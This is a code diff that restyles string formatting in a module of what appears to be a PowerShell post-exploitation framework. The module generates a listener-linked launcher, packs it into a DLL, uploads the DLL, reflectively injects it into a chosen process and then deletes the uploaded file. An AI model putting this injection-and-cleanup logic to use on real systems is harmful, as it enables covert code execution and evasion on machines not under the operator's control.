@@ -50,7 +50,7 @@ class Module:
         script_end = ""
         if not main_menu.listenersv2.get_active_listener_by_name(listener_name):
             # not a valid listener, return nothing for the script
-            return handle_error_message("[!] Invalid listener: %s" % (listener_name))
+            return handle_error_message(f"[!] Invalid listener: {listener_name}")
         else:
             # generate the PowerShell one-liner with all of the proper options set
             launcher = main_menu.stagers.generate_launcher(
@@ -70,11 +70,7 @@ class Module:
             else:
                 launcher_code = launcher.split(" ")[-1]
 
-                script_end += (
-                    "Invoke-ReflectivePEInjection -PEPath {} -ProcName {} ".format(
-                        full_upload_path, proc_name
-                    )
-                )
+                script_end += f"Invoke-ReflectivePEInjection -PEPath {full_upload_path} -ProcName {proc_name} "
                 dll = main_menu.stagers.generate_dll(launcher_code, arch)
                 upload_script = main_menu.stagers.generate_upload(dll, full_upload_path)
 
@@ -83,7 +79,7 @@ class Module:
                 script += "\r\n"
 
                 script_end += "\r\n"
-                script_end += "Remove-Item -Path %s" % full_upload_path
+                script_end += f"Remove-Item -Path {full_upload_path}"
 
                 script = main_menu.modulesv2.finalize_module(
                     script=script,
